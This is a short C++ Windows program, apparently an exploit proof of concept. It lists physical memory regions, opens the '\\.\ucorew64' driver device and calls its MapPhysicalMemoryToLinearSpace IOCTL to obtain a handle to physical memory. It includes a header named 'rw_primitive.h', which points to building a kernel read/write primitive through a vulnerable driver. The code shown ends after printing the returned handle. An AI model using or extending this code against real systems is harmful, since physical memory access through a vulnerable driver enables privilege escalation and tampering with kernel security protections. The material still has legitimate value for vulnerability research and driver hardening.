#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#include "rw_primitive.h"
#include "windows_helper_functions.h"


int main(char argc, char** argv)
{
	HANDLE device = INVALID_HANDLE_VALUE;
	HANDLE hPhysical = NULL;
	NTSTATUS status = FALSE;

	DWORD bytesReturned = 0;
	int memoryRegions = -1;

	memoryRegions = GetPhysicalMemoryLayout(NULL);
	if (memoryRegions == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memoryRegions, sizeof(MEMORY_REGION));
	if (memRegion == NULL) {
		fprintf(stderr, "[!] calloc() failed.\n");
		return -1;
	}
	memoryRegions = GetPhysicalMemoryLayout(memRegion);
	if (memoryRegions == -1) {
		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
		return -1;
	}
	
	printf("physical memory regions\n");
	for (int i = 0; i < memoryRegions; i++) {
		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
	}



	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
		return FALSE;
	}

	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &hPhysical, sizeof(hPhysical), &hPhysical, sizeof(hPhysical), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
		return EXIT_FAILURE;
	}
	printf("%p", (void*)hPhysical);

	return EXIT_SUCCESS;
}